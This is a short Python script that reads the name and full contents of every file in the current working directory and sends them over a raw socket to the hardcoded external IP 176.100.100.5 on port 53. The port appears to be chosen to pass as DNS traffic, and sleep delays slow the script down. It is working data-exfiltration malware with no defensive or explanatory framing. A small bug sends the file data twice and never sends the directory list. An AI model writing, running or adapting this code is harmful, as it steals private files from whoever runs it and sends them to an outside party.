import os
import socket
import time
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

files = []
file_data = []
directories = []
cwd = os.getcwd()
for file in os.listdir():
    time.sleep(5)
    full_path = os.path.join(cwd, file) # Get full path
    if os.path.isfile(full_path): #check if a file is a file
        file_open = open(file, "r") # open the file
        file_data_read = file_open.read() # read the data
        time.sleep(2)
        file_data.append(f"{file} : {file_data_read}") # save the file name and data
        time.sleep(1)
        files.append(file) # if True then append to files list
    else: # else
        directories.append(file) # Append to directories list

data1 = f"files : {file_data}"
pause = "       "
data2 = f"directories : {directories}"

def send(): # Send the data
    s.connect(("176.100.100.5", 53))
    time.sleep(5)
    s.send(data1.encode())
    s.send(pause.encode())
    time.sleep(5)
    s.send(data1.encode())

time.sleep(1)
send()